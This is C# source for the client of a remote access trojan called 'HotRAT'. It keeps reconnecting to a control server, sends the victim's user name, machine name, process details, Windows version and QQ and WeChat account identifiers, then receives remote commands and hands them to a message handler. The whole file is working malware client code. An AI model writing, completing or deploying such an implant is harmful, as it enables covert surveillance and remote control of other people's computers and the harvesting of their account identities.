using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace HotRAT.Client
{
    internal class Program
    {
        private static bool _isRunning = true;
        private static int _reconnectDelay = 5000;

        static async Task Main(string[] args)
        {
            Console.CancelKeyPress += (sender, e) =>
            {
                _isRunning = false;
                e.Cancel = true;
            };

            while (_isRunning)
            {
                try
                {
                    using var client = new TcpClient();
                    await client.ConnectAsync("localhost", 8080);
                    await HandleConnection(client);
                }
                catch
                {
                    Console.WriteLine($"重连");
                    await Task.Delay(_reconnectDelay);
                }
            }
        }

        static async Task HandleConnection(TcpClient client)
        {
            using var stream = client.GetStream();
            var proc = Process.GetCurrentProcess();
            using var ms = new MemoryStream();
            using (var writer = new BinaryWriter(ms, Encoding.UTF8, true))
            {
                writer.Write(Environment.UserName);
                writer.Write(Environment.MachineName);
                writer.Write(proc.ProcessName);
                writer.Write(proc.Id);
                writer.Write(GetInfo.Detect());
                writer.Write(GetInfo.GetWindowsVersion());
                writer.Write(GetInfo.GetQQNumber());
                writer.Write(GetInfo.GetWxID());
            }

            var data = ms.ToArray();
            var header = BitConverter.GetBytes(data.Length);
            var typeByte = new byte[] { 0x01 };

            await stream.WriteAsync(header, 0, header.Length);
            await stream.WriteAsync(typeByte, 0, typeByte.Length);
            await stream.WriteAsync(data, 0, data.Length);
            try
            {
                while (_isRunning)
                {
                    var lengthBuffer = new byte[4];
                    await stream.ReadAsync(lengthBuffer, 0, 4);
                    int messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                    var typeBuffer = new byte[1];
                    await stream.ReadAsync(typeBuffer, 0, 1);
                    byte messageType = typeBuffer[0];

                    var messageBuffer = new byte[messageLength];
                    await stream.ReadAsync(messageBuffer, 0, messageLength);

                    if (messageType == 0x02)
                    {
                        string receivedMessage = Encoding.UTF8.GetString(messageBuffer);
                        MessageHandle.Handle(receivedMessage, stream);
                        Console.WriteLine($"收到消息: {receivedMessage}");
                    }
                }
            }catch{}
        }
    }
}